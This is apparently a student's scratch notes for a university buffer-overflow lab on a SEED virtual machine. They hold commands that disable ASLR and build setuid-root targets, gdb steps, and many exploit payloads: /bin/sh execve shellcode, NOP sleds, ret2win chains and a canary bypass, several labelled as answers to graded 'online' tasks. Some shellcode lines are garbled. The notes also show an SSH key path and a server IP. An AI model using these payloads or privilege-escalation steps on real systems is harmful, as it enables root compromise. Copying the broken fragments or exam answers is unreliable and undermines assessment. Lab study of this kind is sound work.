@@ -1,0 +1,338 @@
+
+
+
+
+az vm start --resource-group seed-rg --name seed-vm
+az vm show --resource-group seed-rg --name seed-vm --show-details --query publicIps -o tsv
+scp -i C:\Users\A\.ssh\id_rsa -r "D:\Level-4Term-1\CSE406-Cybersecurity_Sessional\Online-1-buffer-overflow\BufferOverflowSession\BufferOverflowSession" seed@20.205.97.7:/home/seed/
+ssh -i C:\Users\A\.ssh\id_rsa -L 5901:localhost:5901 seed@20.205.97.7
+
+sudo sysctl -w kernel.randomize_va_space=0
+sudo ln -sf /bin/zsh /bin/sh
+gcc -m32 -o target_dbg -g -z exectarget -fno-stack-protector main.c
+sudo chown root target_dbg
+sudo chmod 4755 target_dbg
+
+rm -rf * .[^.]*
+cp -r Ret2Win/. shatabdi/
+
+
+
+
+
+injection
+ssh -i C:\Users\A\.ssh\id_rsa -L 5901:localhost:5901 seed@20.205.97.7
+
+cd practice/shatabdi
+rm -rf * .[^.]*
+cd ..
+cp -r Inject2Win/. shatabdi/
+cd shatabdi
+aro kaj.....
+sudo sysctl -w kernel.randomize_va_space=0
+gcc -m32 -fno-stack-protector -no-pie -z execstack -o target_dbg -g target.c
+cd .
+gdb `pwd`/target_dbg
+unset environment LINES
+unset environment COLUMNS
+set exec-wrapper env -i
+b foo
+run
+n
+p/d (void*)$ebp + 4 - (void*)&buffer
+p $ebp + 8
+b'A'*112+p32(0xffffdc60)+win_function+b'\x00'
+exploit,badfile
+cd .
+env -i `pwd`/target_dbg
+sudo chown root target_dbg
+sudo chmod 4755 target_dbg
+
+
+
+wc -c badfile
+
+
+
+
+
+Normal
+
+ssh -i C:\Users\A\.ssh\id_rsa -L 5901:localhost:5901 seed@20.205.97.7
+cd practice/shatabdi
+ls -la
+rm -rf * .[^.]*
+ls -la
+touch A1.c
+nano A1.c
+sudo sysctl -w kernel.randomize_va_space=0
+gcc -m32 -fno-stack-protector -no-pie -z execstack -o target_dbg -g main.c
+ls -la
+sudo chown root target_dbg
+sudo chmod 4755 target_dbg
+ls -la
+touch badfile
+touch exploit.py
+nano exploit.py
+with open("badfile", "wb") as f:
+    f.write(b'\x00')
+
+gdb target_dbg
+
+
+gdb-peda$ p $ebp+8
+$2 = (void *) 0xffffd2d0
+
+payload=b'A'*480+p32(0xffffd2d0)+p32(0x2f2f6269)+p32(0x6e2f7368)+b'\x00'
+content=bytearray([0x90 for _ in range(528)])
+
+onlie-a1 16 batch
+shellcode = (
+"\x31\xc0"
+"\x50"
+"\x68""//sh"
+"\x68""/bin"
+"\x89\xe3"
+"\x50"
+"\x53"
+"\x89\xe1"
+"\x99"
+"\xb0\x0b"
+"\xcd\x80"
+).encode('latin-1')
+
+buffer_addr = 0xffffd9fc   # direct-run theke pawa
+
+content = bytearray(0x90 for _ in range(528))
+
+cushion = 24                              # push-guloke absorb korar jonno safe gap
+shell_end = 480 - cushion                 # = 456
+shell_start = shell_end - len(shellcode)  # = 432
+
+content[shell_start:shell_end] = shellcode
+
+ret = buffer_addr + 200                   # NOP sled-er (0 theke shell_start=432) moddhe kono jaygay
+content[480:484] = ret.to_bytes(4, byteorder='little')
+
+with open('badfile', 'wb') as f:
+    f.write(content)
+
+online-a2 16 batch
+xor eax,eax
+xor ecx,ecx
+mov al,1
+mov cl,6
+push ecx
+push eax
+mov ebx,0x0804924f
+call ebx
+xor ecx,ecx
+push ecx
+push eax
+call ebx
+xor ecx,ecx
+mov cl,5
+push ecx
+push eax
+call ebx
+xor ecx,ecx
+push ecx
+push eax
+call ebx
+xor ecx,ecx
+mov cl,3
+push ecx
+push eax
+call ebx
+xor ecx,ecx
+mov cl,1
+push ecx
+push eax
+call ebx
+
+p/d (void*)$ebp + 4 - (void*)&buffer
+p $ebp + 8
+
+shellcode=b"\x31\xC0\x31\xC9\xB0\x01\xB1\x06\x51\x50\xBB\x4F\x92\x04\x08\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\xB1\x05\x51\x50\xFF\xD3\x31\xC9\x51\x50\xFF\xD3\x31\xC9\xB1\x03\x51\x50\xFF\xD3\x31\xC9\xB1\x01\x51\x50\xFF\xD3"
+def p32(x):
+    return x.to_bytes(4, "little")
+
+content=b'A'*989+p32(0xffffd560)+shellcode+b'\x00'
+with open('badfile', 'wb') as f:
+    f.write(content)
+
+online-b1 16 batch
+
+
+shellcode= (
+"\x31\xc0"
+"\x50"
+"\x68""//sh"
+"\x68""/bin"
+"\x89\cat xe3"
+"\x50"
+"\x53"
+"\x89\xe1"
+"\x99"
+"\xb0\x0b"
+"\xcd\x80"
+).encode('latin-1')
+def p32(x):
+    return x.to_bytes(4, "little")
+content=shellcode+b'A'*(666-len(shellcode))+p32(0x80492ae)+p32(0xffffbdb2)+b'\x00'
+with open('badfile', 'wb') as f:
+    f.write(content)
+
+
+online-b2 16 batch
+mov ebx,0x0804926b
+call ebx
+push eax
+mov ebx ,0x804924f
+call ebx
+
+shellcode=b"\xBB\x6B\x92\x04\x08\xFF\xD3\x50\xBB\x4F\x92\x04\x08\xFF\xD3"
+def p32(x):
+    return x.to_bytes(4, "little")
+content=shellcode+b'A'*(336-len(shellcode))+p32(0xffffd4ac)+b'\x00'
+with open('badfile', 'wb') as f:
+    f.write(content)
+
+online-B1 18batch
+def p32(x):
+    return x.to_bytes(4, "little")
+content=b'A'*48+p32(0x8049236)+b'\x00'
+with open('badfile', 'wb') as f:
+    f.write(content)
+
+online-A1 18batch
+def p32(x):
+    return x.to_bytes(4, "little")
+content=b'A'*48+p32(0x804931e)+p32(0x8049256)+b'A'*4+b'\x88\x80\x08\x08'+b'\x04\x00'
+with open('username', 'wb') as f:
+    f.write(content)
+
+
+online-A1 21 batch
+payload=b"admin\x00"+b"A"*57+p32(CANARY_VAL)+b"A"*28+b"UNLOCK\x00"+b"A"*(32-7)+b"\n"+b"A"*64
+
+online-A1 19 batch
+0xffffd2be
+0xffffd44e
+
+def p32(x):
+    return x.to_bytes(4, "little")
+
+content=b'A'*62+p32(0x8049236)+b'A'*4+p32(0xffffd44e)+p32(0xffffd2be)+b'\x00'
+with open('username', 'wb') as f:
+    f.write(content)
+
+Segmentation fault-এর পরে GDB-তে চালাও:
+
+run
+
+crash হলে:
+
+info registers
+
+বিশেষ করে:
+
+p/x $eip
+
+অথবা
+
+x/i $eip
+
+যদি দেখো
+EIP = 0x41414141
+
+→ offset ভুল।
+
+যদি দেখো
+EIP = 0x08049236
+
+→ get_service()-এ ঢুকেছে, crash ভেতরে হচ্ছে।
+
+যদি দেখো
+EIP = 0xffffd44e
+
+বা অন্য কোনো address,
+
+→ payload alignment ভুল।
+
+A2 19 batch
+b inside_dark_web
+run
+info registers
+p/x *(int *)($esp+4)
+def p32(x):
+    return x.to_bytes(4, "little")
+
+shellcode=
+content=b'A'*710+p32(0x80492de)+p32(0x8049256)+p32(0xffffb786)+p32(0xffffba54)+b'A'*4+p32(0x08088088)+p32(4)+b'\x00'
+content=b'A'*710+p32(0x80492de)+p32(0x8049256)+p32(0xffffb786)+p32(0xffffba54)+b'A'*4+p32(0x08088088)+p32(4)+b'\x00'
+with open('username', 'wb') as f:
+    f.write(content)
+
+xor eax,eax
+xor ecx,ecx
+mov cl , 4
+push ecx
+push eax
+mov ebx,0x080491f6
+call ebx
+
+shellcode=b"\x31\xC0\x31\xC9\xB1\x04\x51\x50\xE8\xF2\x91\x04\x08"
+content=b"A"*112+p32(0xffffdc60)+shellcode+"\x00"
+
+
+
+xor    eax,eax
+push   eax
+push   0x68732f6e
+push   0x69622f2f
+mov    eax,esp
+push   eax
+mov    ebx,0x8049216
+call   ebx
+function er vitor //bin/sh execute hobe
+shellcode=b"\x31\xC0\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE0\x50\xBB\x16\x92\x04\x08\xFF\xD3"
+payload=b"A"*112+p32(0xffffdc60)+shellcode+b"\x00"
+
+
+def p32(x):
+    return x.to_bytes(4, "little")
+payload=b"A"*112+p32(0x80491f6)+b"A"*4+p32(0xdeadbeef)+p32(0xcafebabe)+b"\x00"
+with open('badfile', 'wb') as f:
+    f.write(payload)
+
+
+def p32(x):
+    return x.to_bytes(4, "little")
+payload=b"A"*112+p32(0x80491f6)+p32(0x080492c5)+b"\x00" 
+with open('badfile', 'wb') as f:
+    f.write(payload)
+
+
+p (*(unsigned *)$ebp-4)
+p (*(unsigned *)$ebp)
+p win
+p (*(unsigned *)$ebp+4)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
